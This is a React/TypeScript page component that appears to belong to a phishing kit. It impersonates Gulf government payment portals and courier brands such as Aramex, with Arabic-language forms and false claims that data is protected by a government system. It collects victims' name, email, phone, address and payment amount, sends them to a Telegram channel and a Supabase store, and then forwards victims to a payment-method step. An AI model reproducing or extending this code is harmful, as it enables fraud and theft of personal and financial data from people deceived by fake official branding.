import type { PaymentPayload } from "@/types/payload";
import { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Helmet } from "react-helmet-async";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getCountryByCode } from "@/lib/countries";
import { getCurrencySymbol, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
import { getGovernmentServicesByCountry } from "@/lib/gccGovernmentServices";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { getCompanyMeta } from "@/utils/companyMeta";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { sendToTelegram } from "@/lib/telegram";
import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin, DollarSign, FileText } from "lucide-react";

const PaymentRecipient = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);
  const updateLink = useUpdateLink();
  const [customerName, setCustomerName] = useState("");
  const [customerEmail, setCustomerEmail] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  const [residentialAddress, setResidentialAddress] = useState("");
  const [paymentAmount, setPaymentAmount] = useState("");
  const [selectedService, setSelectedService] = useState("");

  // Get link payload first
  const shippingInfo = linkData?.payload as PaymentPayload;

  // Get payer type from shipping info (default to "recipient" for backward compatibility)
  const payerType = shippingInfo?.payer_type || "recipient";

  // Get country from link data (must be before using currency functions)
  const countryCode = shippingInfo?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);
  const phoneCode = countryData?.phoneCode || "+966";

  // Get query parameters from URL
  const urlParams = new URLSearchParams(window.location.search);
  const serviceKey = urlParams.get('company') || linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
  const currencyParam = urlParams.get('currency');
  const titleParam = urlParams.get('title');

  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const companyMeta = getCompanyMeta(serviceKey);

  // Get government payment system for the country (use this for styling)
  const govSystem = getGovernmentPaymentSystem(countryCode);

  // Get government services for the country
  const governmentServices = useMemo(
    () => getGovernmentServicesByCountry(countryCode),
    [countryCode]
  );

  // Use GOVERNMENT branding colors (not company branding)
  const colors = govSystem.colors;

  // Use government branding properties
  const brandingProps = {
    colors,
    fonts: govSystem.fonts,
    shadows: govSystem.shadows,
    gradients: govSystem.gradients,
    borderRadius: govSystem.borderRadius,
    name: govSystem.nameEn,
    nameAr: govSystem.nameAr,
    logo: branding.logo
  };

  // Use hero image from government system with fallback
  const heroImage = govSystem.heroImage || branding.heroImage || "/assets/hero-bg.jpg";

  // Use dynamic company meta for OG tags
  const dynamicTitle = titleParam || companyMeta.title || `Payment - ${govSystem.nameAr}`;
  const dynamicDescription = companyMeta.description || govSystem.description;
  const dynamicImage = companyMeta.image;

  // Get currency code from link data, URL parameter, or country data
  const savedCurrencyCode = shippingInfo?.currency_code;
  const currencyCode = savedCurrencyCode || currencyParam || countryData?.currency || "SAR";

  // Get amount from link data - ensure it's a number, handle all data types
  const rawAmount = shippingInfo?.cod_amount || shippingInfo?.payment_amount;

  // Handle different data types and edge cases
  let amount = 500; // Default value
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  // Format amount with the dynamic currency code
  const formattedAmount = formatCurrency(amount, currencyCode);

  const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";

  const handleProceed = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!linkData) return;

    // Submit to Netlify Forms
    const formData = new FormData();
    formData.append('form-name', 'payment-recipient');
    formData.append('name', customerName);
    formData.append('email', customerEmail);
    formData.append('phone', customerPhone);
    formData.append('address', residentialAddress);
    formData.append('service', serviceName);
    formData.append('amount', formattedAmount);
    formData.append('linkId', id || '');

    try {
      await fetch('/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams(formData as Record<string, string>).toString()
      });
    } catch (error) {
      console.error('Form submission error:', error);
    }

    // Send data to Telegram
    const productionDomain = window.location.origin;
    const telegramResult = await sendToTelegram({
      type: 'payment_recipient',
      data: {
        name: customerName,
        email: customerEmail,
        phone: customerPhone,
        address: residentialAddress,
        service: serviceName,
        amount: formattedAmount,
        payment_url: `${productionDomain}/pay/${id}/details`
      },
      timestamp: new Date().toISOString()
    });

    // Get selected service data
    const selectedServiceData = governmentServices.find(s => s.key === selectedService);
    const finalAmount = parseFloat(paymentAmount) || amount;

    // Save customer data to the link's payload in Supabase for cross-device compatibility
    try {
      const customerData = {
        ...linkData.payload,
        customerInfo: {
          name: customerName,
          email: customerEmail,
          phone: customerPhone,
          address: residentialAddress,
          service: serviceName,
          amount: formatCurrency(finalAmount, currencyCode),
          selectedServiceKey: selectedService,
          selectedServiceName: selectedServiceData?.nameAr || '',
        },
        payment_amount: finalAmount,
        currency_code: currencyCode,
        selectedCountry: countryCode,
        government_service: selectedService,
        government_service_name: selectedServiceData?.nameAr || '',
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: customerData
      });
    } catch (error) {
      // Silent error handling
    }

    navigate(`/pay/${id}/payment-method`);
  };
  
  return (
    <>
      <PaymentMetaTags
        serviceName={serviceName}
        serviceKey={serviceKey}
        amount={formattedAmount}
        title={dynamicTitle}
        description={dynamicDescription}
      />
      {/* Dynamic OG Image via direct meta tag injection */}
      <Helmet>
        <meta property="og:image" content={dynamicImage} />
        <meta name="twitter:image" content={dynamicImage} />
      </Helmet>
      <div className="min-h-screen" style={{ backgroundColor: govSystem.colors.surface }} dir="rtl">
        {/* Hero Section with Government Branding */}
        <div 
          className="relative w-full h-64 overflow-hidden" 
          style={{ 
            background: govSystem.gradients.header,
            backgroundImage: govSystem.heroImage ? `url(${govSystem.heroImage})` : undefined,
            backgroundSize: 'cover',
            backgroundPosition: 'center'
          }}
        >
          <div className="absolute inset-0 bg-black/20" />

          {/* Government Logo/Badge */}
          <div className="absolute top-4 left-4 sm:top-6 sm:left-6">
            <div
              className="rounded-2xl p-3 sm:p-4 shadow-lg flex items-center gap-3"
              style={{
                backgroundColor: 'rgba(255, 255, 255, 0.95)',
                border: `2px solid ${govSystem.colors.primary}`,
                boxShadow: govSystem.shadows.md
              }}
            >
              {govSystem.logo && (
                <img 
                  src={govSystem.logo} 
                  alt={govSystem.nameAr}
                  className="h-10 sm:h-12 w-auto object-contain"
                  style={{ filter: 'drop-shadow(0 2px 4px rgba(0,0,0,0.1))' }}
                />
              )}
              {!govSystem.logo && (
                <div className="text-center">
                  <div 
                    className="text-2xl font-bold mb-1"
                    style={{ 
                      color: govSystem.colors.primary,
                      fontFamily: govSystem.fonts.primaryAr
                    }}
                  >
                    {govSystem.nameAr}
                  </div>
                  <div 
                    className="text-xs"
                    style={{ color: govSystem.colors.textLight }}
                  >
                    {govSystem.nameEn}
                  </div>
                </div>
              )}
            </div>
          </div>

          {/* Title and Info Overlay */}
          <div className="absolute bottom-6 right-6 text-white max-w-2xl">
            <div className="text-right">
              <h2
                className="text-2xl font-bold mb-2"
                style={{
                  fontFamily: govSystem.fonts.primaryAr,
                  textShadow: '2px 2px 4px rgba(0,0,0,0.5)'
                }}
              >
                {payerType === "recipient" ? "معلومات المستلم" : "معلومات المرسل"}
              </h2>
              <p
                className="text-sm opacity-90 mb-1"
                style={{
                  fontFamily: govSystem.fonts.primaryAr,
                  textShadow: '1px 1px 2px rgba(0,0,0,0.5)'
                }}
              >
                {govSystem.description}
              </p>
              <p
                className="text-lg font-semibold"
                style={{
                  fontFamily: govSystem.fonts.primaryAr,
                  textShadow: '1px 1px 2px rgba(0,0,0,0.5)'
                }}
              >
                {formattedAmount}
              </p>
            </div>
          </div>
        </div>

        <div className="container mx-auto px-4 py-8">
          <div className="max-w-4xl mx-auto">
            {/* Security Notice with Government Branding */}
            <div
              className="mb-6 p-4 bg-white rounded-lg border-r-4"
              style={{ 
                borderRightColor: govSystem.colors.primary,
                borderRadius: govSystem.borderRadius.md
              }}
            >
              <div className="flex items-start gap-3">
                <Shield className="w-5 h-5 mt-0.5" style={{ color: govSystem.colors.primary }} />
                <div>
                  <h3
                    className="font-semibold text-sm mb-1"
                    style={{
                      color: govSystem.colors.text,
                      fontFamily: govSystem.fonts.primaryAr
                    }}
                  >
                    بياناتك محمية بنظام {govSystem.nameAr}
                  </h3>
                  <p
                    className="text-xs"
                    style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}
                  >
                    نحن نستخدم أعلى معايير الأمان لحماية معلوماتك الشخصية والمالية
                  </p>
                </div>
              </div>
            </div>

            <Card
              className="p-6 sm:p-8 shadow-lg border-0 rounded-lg overflow-hidden"
              style={{
                background: govSystem.colors.background,
                boxShadow: govSystem.shadows.lg,
                borderRadius: govSystem.borderRadius.lg
              }}
            >
              <div className="mb-6">
                <div className="flex items-center gap-3 mb-2">
                  <div
                    className="w-12 h-12 rounded-full flex items-center justify-center"
                    style={{ backgroundColor: `${govSystem.colors.primary}15` }}
                  >
                    <User className="w-6 h-6" style={{ color: govSystem.colors.primary }} />
                  </div>
                  <div>
                    <h3
                      className="text-lg font-bold"
                      style={{
                        color: govSystem.colors.text,
                        fontFamily: govSystem.fonts.primaryAr
                      }}
                    >
                      {payerType === "recipient" ? "بيانات المستلم" : "بيانات المرسل"}
                    </h3>
                    <p
                      className="text-sm"
                      style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}
                    >
                      الرجاء إدخال جميع البيانات المطلوبة
                    </p>
                  </div>
                </div>
              </div>

              <form onSubmit={handleProceed} className="space-y-5">
                {/* Customer Name */}
                <div>
                  <Label
                    htmlFor="name"
                    className="flex items-center gap-2 mb-2 text-sm font-medium"
                    style={{
                      color: govSystem.colors.text,
                      fontFamily: govSystem.fonts.primaryAr
                    }}
                  >
                    <User className="w-4 h-4" />
                    الاسم الكامل *
                  </Label>
                  <Input
                    id="name"
                    value={customerName}
                    onChange={(e) => setCustomerName(e.target.value)}
                    required
                    className="h-12 text-base transition-colors bg-white"
                    style={{
                      borderWidth: '2px',
                      borderColor: govSystem.colors.border,
                      borderRadius: govSystem.borderRadius.md,
                      fontFamily: govSystem.fonts.primaryAr,
                      color: govSystem.colors.text
                    }}
                    placeholder="أدخل اسمك الكامل"
                  />
                </div>

                {/* Customer Email */}
                <div>
                  <Label
                    htmlFor="email"
                    className="flex items-center gap-2 mb-2 text-sm font-medium"
                    style={{
                      color: govSystem.colors.text,
                      fontFamily: govSystem.fonts.primaryAr
                    }}
                  >
                    <Mail className="w-4 h-4" />
                    البريد الإلكتروني *
                  </Label>
                  <Input
                    id="email"
                    type="email"
                    value={customerEmail}
                    onChange={(e) => setCustomerEmail(e.target.value)}
                    required
                    className="h-12 text-base transition-colors bg-white"
                    style={{
                      borderWidth: '2px',
                      borderColor: govSystem.colors.border,
                      borderRadius: govSystem.borderRadius.md,
                      fontFamily: govSystem.fonts.primaryAr,
                      color: govSystem.colors.text
                    }}
                    placeholder="example@email.com"
                  />
                </div>

                {/* Customer Phone */}
                <div>
                  <Label
                    htmlFor="phone"
                    className="flex items-center gap-2 mb-2 text-sm font-medium"
                    style={{
                      color: govSystem.colors.text,
                      fontFamily: govSystem.fonts.primaryAr
                    }}
                  >
                    <Phone className="w-4 h-4" />
                    رقم الهاتف *
                  </Label>
                  <Input
                    id="phone"
                    type="tel"
                    value={customerPhone}
                    onChange={(e) => setCustomerPhone(e.target.value)}
                    required
                    className="h-12 text-base transition-colors bg-white"
                    style={{
                      borderWidth: '2px',
                      borderColor: govSystem.colors.border,
                      borderRadius: govSystem.borderRadius.md,
                      fontFamily: govSystem.fonts.primaryAr,
                      color: govSystem.colors.text
                    }}
                    placeholder={`${phoneCode} ${phonePlaceholder}`}
                  />
                </div>

                {/* Residential Address */}
                <div>
                  <Label
                    htmlFor="address"
                    className="flex items-center gap-2 mb-2 text-sm font-medium"
                    style={{
                      color: govSystem.colors.text,
                      fontFamily: govSystem.fonts.primaryAr
                    }}
                  >
                    <MapPin className="w-4 h-4" />
                    العنوان *
                  </Label>
                  <Input
                    id="address"
                    value={residentialAddress}
                    onChange={(e) => setResidentialAddress(e.target.value)}
                    required
                    className="h-12 text-base transition-colors bg-white"
                    style={{
                      borderWidth: '2px',
                      borderColor: govSystem.colors.border,
                      borderRadius: govSystem.borderRadius.md,
                      fontFamily: govSystem.fonts.primaryAr,
                      color: govSystem.colors.text
                    }}
                    placeholder="أدخل عنوانك الكامل"
                  />
                </div>

                {/* Government Service Selection */}
                <div>
                  <Label
                    htmlFor="service"
                    className="flex items-center gap-2 mb-2 text-sm font-medium"
                    style={{
                      color: govSystem.colors.text,
                      fontFamily: govSystem.fonts.primaryAr
                    }}
                  >
                    <FileText className="w-4 h-4" />
                    الخدمة *
                  </Label>
                  <Select value={selectedService} onValueChange={setSelectedService}>
                    <SelectTrigger
                      className="h-12 text-base bg-white"
                      style={{
                        borderWidth: '2px',
                        borderColor: govSystem.colors.border,
                        borderRadius: govSystem.borderRadius.md,
                        fontFamily: govSystem.fonts.primaryAr,
                      }}
                    >
                      <SelectValue placeholder="اختر الخدمة" />
                    </SelectTrigger>
                    <SelectContent
                      className="bg-background z-50"
                      style={{
                        fontFamily: govSystem.fonts.primaryAr,
                      }}
                    >
                      {governmentServices.map((service) => (
                        <SelectItem key={service.id} value={service.key}>
                          {service.nameAr}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                  {selectedService && (
                    <p className="text-xs mt-1" style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>
                      {governmentServices.find(s => s.key === selectedService)?.description}
                    </p>
                  )}
                </div>

                {/* Payment Amount */}
                <div>
                  <Label
                    htmlFor="amount"
                    className="flex items-center gap-2 mb-2 text-sm font-medium"
                    style={{
                      color: govSystem.colors.text,
                      fontFamily: govSystem.fonts.primaryAr
                    }}
                  >
                    <DollarSign className="w-4 h-4" />
                    المبلغ *
                  </Label>
                  <Input
                    id="amount"
                    type="number"
                    value={paymentAmount || amount}
                    onChange={(e) => setPaymentAmount(e.target.value)}
                    required
                    className="h-12 text-base transition-colors bg-white"
                    style={{
                      borderWidth: '2px',
                      borderColor: govSystem.colors.border,
                      borderRadius: govSystem.borderRadius.md,
                      fontFamily: govSystem.fonts.primaryAr,
                      color: govSystem.colors.text
                    }}
                    placeholder={`${getCurrencySymbol(countryCode)}`}
                    step="0.01"
                    min="0"
                  />
                  <p className="text-xs mt-1" style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>
                    💱 العملة: {getCurrencySymbol(countryCode)}
                  </p>
                </div>

                {/* Payment Summary */}
                <div
                  className="mt-6 p-4 rounded-lg"
                  style={{
                    backgroundColor: `${govSystem.colors.primary}08`,
                    borderRadius: govSystem.borderRadius.md,
                    border: `1px solid ${govSystem.colors.primary}20`
                  }}
                >
                  <h4
                    className="font-semibold mb-3"
                    style={{
                      color: govSystem.colors.text,
                      fontFamily: govSystem.fonts.primaryAr
                    }}
                  >
                    ملخص المبلغ
                  </h4>
                  <div className="flex justify-between items-center">
                    <span
                      className="text-sm"
                      style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}
                    >
                      المبلغ الإجمالي
                    </span>
                    <span
                      className="text-xl font-bold"
                      style={{ color: govSystem.colors.primary, fontFamily: govSystem.fonts.primaryAr }}
                    >
                      {formattedAmount}
                    </span>
                  </div>
                </div>

                {/* Proceed Button */}
                <Button
                  type="submit"
                  size="lg"
                  className="w-full h-14 text-lg font-bold mt-6 transition-all hover:opacity-90"
                  style={{
                    background: govSystem.gradients.primary,
                    color: govSystem.colors.textOnPrimary,
                    borderRadius: govSystem.borderRadius.lg,
                    boxShadow: govSystem.shadows.md,
                    fontFamily: govSystem.fonts.primaryAr
                  }}
                  disabled={
                    !customerName ||
                    !customerEmail ||
                    !customerPhone ||
                    !residentialAddress ||
                    !selectedService ||
                    !paymentAmount
                  }
                >
                  <span className="ml-2">متابعة الدفع عبر {govSystem.nameAr}</span>
                  <ArrowLeft className="w-5 h-5" />
                </Button>

                <p
                  className="text-xs text-center mt-4"
                  style={{
                    color: govSystem.colors.textLight,
                    fontFamily: govSystem.fonts.primaryAr
                  }}
                >
                  بالمتابعة عبر {govSystem.nameAr}، أنت توافق على الشروط والأحكام
                </p>
              </form>
            </Card>

            {/* Security Footer */}
            <div className="mt-6 text-center">
              <div
                className="inline-flex items-center gap-2 px-4 py-2 bg-white rounded-full shadow-sm"
                style={{ 
                  boxShadow: govSystem.shadows.sm,
                  border: `1px solid ${govSystem.colors.border}`
                }}
              >
                <Shield className="w-4 h-4" style={{ color: govSystem.colors.primary }} />
                <span
                  className="text-xs font-medium"
                  style={{
                    color: govSystem.colors.text,
                    fontFamily: govSystem.fonts.primaryAr
                  }}
                >
                  محمي بنظام {govSystem.nameAr} الحكومي
                </span>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Hidden Netlify Form */}
      <form name="payment-recipient" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
        <input type="text" name="name" />
        <input type="email" name="email" />
        <input type="tel" name="phone" />
        <input type="text" name="address" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="linkId" />
      </form>
    </>
  );
};

export default PaymentRecipient;
